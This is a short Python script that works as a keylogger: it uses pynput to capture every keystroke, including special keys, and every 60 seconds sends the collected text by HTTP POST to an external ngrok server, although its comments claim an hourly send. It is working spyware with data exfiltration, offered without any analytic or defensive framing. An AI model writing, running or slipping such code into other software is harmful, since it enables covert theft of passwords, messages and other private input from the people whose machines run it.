from pynput import keyboard
import requests
import threading

# Store keys in memory
key_log = []

# Server endpoint
API_URL = "https://893f13a17c53-18320658179660089964.ngrok-free.app/api/keys"

# Function to send data to the server
def send_to_server(data):
    try:
        response = requests.post(API_URL, json={"keys": data})
        print(f"Data sent to server. Response: {response.status_code}")
    except Exception as e:
        print(f"Error sending data: {e}")

# Periodically send keys to the server (once an hour)
def hourly_send(interval=60):
    global key_log
    threading.Timer(interval, hourly_send, [interval]).start()  # Restart timer for the next interval
    if key_log:
        # Send the accumulated data to the server
        send_to_server("".join(key_log))
        # Clear the memory after sending
        key_log = []

# Key press handler
def on_press(key):
    try:
        # Append the key character to the log
        key_log.append(key.char)
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl, etc.)
        key_log.append(f"[{key}]")

# Key release handler
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start periodic sending (once an hour)
hourly_send(interval=60)  # Send data every hour (3600 seconds)

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

